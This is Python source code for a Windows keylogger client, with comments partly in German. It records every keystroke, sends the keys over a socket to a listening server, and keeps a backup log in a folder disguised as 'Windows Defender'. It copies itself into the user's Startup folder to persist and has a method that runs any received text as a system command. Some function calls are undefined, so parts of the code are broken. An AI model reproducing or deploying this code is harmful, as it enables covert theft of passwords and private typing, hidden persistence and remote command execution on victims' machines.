from pynput.keyboard import Listener
from os import system, getenv, getlogin, makedirs, remove
import socket
from pickle import dumps
Header = 10


class Global:
    log_file_path = getenv('APPDATA') + "\\Windows Defender\\recvlog.txt"
    key_array = []
    i = 0
    local_log = False


class Logging:

    def __init__(self, path_to_file):
        self.path = path_to_file

    def return_log(self):
        # Method to check whether log_file is created and to return its content
        try:
            x = open(self.path, "rb")
            log = x.read()
        except FileNotFoundError:
            return None
        x.close()
        return log

    def save_log(self, array, create_log=True):
        # Method to save log and to create it if not present
        try:
            if create_log:
                # create file if not present
                x = open(self.path, "a+")
                for char in array:
                    x.write(char)
                x.close()
            else:
                # do not create file if not present
                x = open(self.path, "a")
                for char in array:
                    x.write(char)
                x.close()
        except(FileNotFoundError, PermissionError):
            return False
        return True

    def empty_log(self, rm_file=False):
        # Method to delete file content or the entire file
        try:
            if rm_file:
                remove(self.path)
            else:
                x = open(self.path, "wb")
                x.close()
        except(FileNotFoundError, PermissionError):
            return False
        return True


class Socket:

    connection = False
    cmd_received = False

    def connect_to_server(self):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.settimeout(1)
            self.active_socket.connect((socket.gethostname(), 50000))
            Socket.connection = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            Socket.connection = False
            print("No connection established!")

    def receive_command(self):
        try:
            cmd = self.active_socket.recv(64)
            cmd = cmd.decode()
            system(cmd)
        except socket.timeout:
            print("timeout")
            Socket.cmd_received = False

    def send_char(self, char):
        print(char)
        char = dumps(char)
        char = bytes(f"{len(char):{Header}}", "utf-8") + char
        if Socket.connection:
            try:
                self.active_socket.send(char)
                return True
            except (ConnectionResetError, ConnectionAbortedError, OSError):
                return False
        else:
            return False

    def send_array(self, array):
        if Socket.connection:
            array = dumps(array)
            array = bytes(f"{len(array):{Header}}", "utf-8") + array
            try:
                self.active_socket.send(array)
                Socket.connection = True
            except(ConnectionResetError, ConnectionAbortedError, OSError):
                Socket.connection = False


def no_safe_key_press(key):
    key = str(key).replace("'", "")
    key = dumps(key)
    key = bytes(f"{len(key):{Header}}", "utf-8") + key
    send = connection_established.send_char(key)
    if not send:
        Global.key_array.append(key)
        Socket.connection = False
        return False


def safe_key_press(key):
    key = str(key).replace("'", "")
    Global.key_array.append(key)
    Global.i += 1
    if Global.i == 20:
        Global.i = 0
        return False


def copy_to_startup(file_name):
    file_name = "file.pyw"
    path = str(getenv("SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\" + file_name)
    print(path)
    with open(path, "w+")as f:
        with open("blanc_client.txt", "r")as x:
            blanc = x.read()
        f.write(blanc)


connection_established = Socket()
copy_to_startup("wasd")
while True:
    if not Socket.connection:
        connection_established.connect_to_server()

#    if not Socket.cmd_received:
#        connection_established.receive_command()
    if Socket.connection and not Global.local_log:
        with Listener(on_press=no_safe_key_press)as f:
            f.join()

    elif Socket.connection and Global.local_log:
        connection_established.send_array(get_log())
        if Socket.connection:
            empty_log()

    elif not Socket.connection:
        with Listener(on_press=safe_key_press)as f:
            f.join()
        Global.key_array.append("Lost")
        save_log(Global.key_array)
        Global.key_array = []

# Log Datei mit Übergabe richtig machen
# Log Datei akutaliesiren bzw löschen nachdem gesendet wurde
# Am Anfang gucken ob Log Datei leer oder voll ist
# Sendet chars obwohl connection nicht da ist
